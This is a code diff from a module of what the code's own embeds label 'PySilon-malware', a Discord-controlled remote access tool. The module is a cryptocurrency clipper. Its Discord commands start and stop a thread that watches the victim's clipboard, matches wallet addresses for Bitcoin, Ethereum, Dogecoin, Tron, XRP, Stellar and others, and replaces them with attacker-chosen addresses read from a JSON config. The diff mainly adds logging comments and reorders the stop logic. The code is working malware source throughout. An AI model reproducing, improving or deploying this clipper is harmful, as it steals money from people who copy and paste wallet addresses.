@@ -4,19 +4,24 @@ import os
 import json
 import threading
 # end of imports
-
 # on message
 elif message.content == '.start-clipper':
+    #.log Message is "start crypto clipper" 
     if clipper_stop:
+        #.log Clipper is not running 
         await message.delete()
+        #.log Removed the message 
         clipper_stop = False
         script_dir = os.path.dirname(os.path.abspath(__file__))
+        #.log Fetched the script directory 
         config_path = os.path.join(script_dir, 'crypto_clipper.json')
+        #.log Fetched the configuration path 
         with open(config_path) as f:
             addresses = json.load(f)
-
+        #.log Fetched the configuration 
         def match():
             clipboard = str(pyperclip.paste())
+            #.log Fetched the clipboard content 
             btc_match = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
             eth_match = re.match("^0x[a-zA-F0-9]{40}$", clipboard)
             doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
@@ -27,40 +32,52 @@ elif message.content == '.start-clipper':
             trx_match = re.match("^T[A-Za-z1-9]{33}$", clipboard)
             xrp_match = re.match("^r[0-9a-zA-Z]{33}$", clipboard)
             xlm_match = re.match("^G[0-9A-Z]{40,60}$", clipboard)
-
+            #.log Tried to match address RegEx 
             for currency, address in addresses.items():
                 if eval(f'{currency.lower()}_match'):
                     if address and address != clipboard:
+                        #.log Matched address with crypto RegEx 
                         pyperclip.copy(address)
+                        #.log Switched the copied address into other one 
                     break
-
         def wait_for_paste():
             while not clipper_stop:
                 pyperclip.waitForNewPaste()
+                #.log New text copied 
                 match()
-
         thread = threading.Thread(target=wait_for_paste)
+        #.log Created the Clipper thread 
         thread.start()
+        #.log Started the Clipper 
         embed = discord.Embed(title="🟢 Crypto Clipper started!",description=f'```Crypto Clipper has been started! Stop it by using .stop-clipper```', colour=discord.Colour.green())
         embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
         await message.channel.send(embed=embed)
+        #.log Sent embed about Clipper startup 
     else:
+        #.log Clipper is already running 
         await message.delete()
+        #.log Removed the message 
         embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is already running! Stop it by using .stop-clipper```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
         await message.channel.send(embed=embed)
-
+        #.log Sent embed about Clipper already running 
 # on message
 elif message.content == '.stop-clipper':
+    #.log Message is "stop crypto clipper" 
+    await message.delete()
+    #.log Removed the message 
     if not clipper_stop:
-        await message.delete()
+        #.log Clipper is running 
+        thread.join()
+        #.log Stopped Clipper 
         embed = discord.Embed(title="🔴 Crypto Clipper stopped!",description=f'```Crypto Clipper has been stopped! Start it using .start-clipper```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
         await message.channel.send(embed=embed)
+        #.log Sent embed about Clipper stopped 
         clipper_stop = True
-        thread.join()
     else:
-        await message.delete()
+        #.log Clipper is not running 
         embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is not running! Start it using .start-clipper```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
         await message.channel.send(embed=embed)
+        #.log Sent embed about Clipper not running 
